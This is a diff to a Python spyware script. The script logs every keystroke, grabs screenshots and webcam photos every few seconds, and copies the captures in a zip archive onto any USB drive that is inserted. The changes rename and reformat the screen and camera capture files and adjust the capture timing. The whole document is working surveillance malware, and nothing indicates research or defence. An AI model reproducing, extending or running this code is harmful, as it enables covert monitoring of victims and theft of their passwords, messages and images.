@@ -1,18 +1,17 @@
-import glob
 import io
 import os
-import socket
-import threading
+import cv2
 import time
+import glob
+import socket
 import zipfile
+import win32file
+import threading
+from PIL import ImageGrab
+import pywinusb.hid as hid
+from pynput import keyboard
 from datetime import datetime
 
-import cv2
-import pyautogui
-import pywinusb.hid as hid
-import win32file
-# import requests
-from pynput import keyboard
 
 keys = ""
 
@@ -54,7 +53,7 @@ def copy_to_flash_drive(zip_data, flash_drive_path, zip_filename):
 
 def device_insertion_handler(action, device):
     if action == "add" and "usb" in device.subsystem and "block" in device.device_type:
-        files_to_zip = glob.glob("*.png") + ["example.txt"]
+        files_to_zip = glob.glob("Screen-*.jpg") + glob.glob("Camera-*.jpg") + ["example.txt"]
 
         zip_filename = f"{get_device_name()}_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}_files.zip"
 
@@ -73,9 +72,12 @@ def on_press(key):
     keys += f"[{datetime.now()}] {key} pressed\n"
 
 
+
 def take_screenshot():
-    screenshot = pyautogui.screenshot()
-    screenshot.save(f"{datetime.now()}.png")
+    screenshot = ImageGrab.grab()
+    screenshot.save(f"Screen-{datetime.now()}.jpg", "JPEG")
+
+
 
 
 def take_picture():
@@ -99,7 +101,7 @@ def take_picture():
     camera.release()
 
     # Save the captured frame as an image
-    image_path = f"{datetime.now}.jpg"
+    image_path = f"Camera-{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.jpg"
     cv2.imwrite(image_path, frame)
 
     # Display the path of the captured image
@@ -126,7 +128,7 @@ if __name__ == "__main__":
         while True:
             time.sleep(30)
             take_screenshot()
-            time.sleep(0.1)
+            time.sleep(1)
             take_picture()
             if len(keys) > 50:
                 with open("log.log", "a") as log_file:
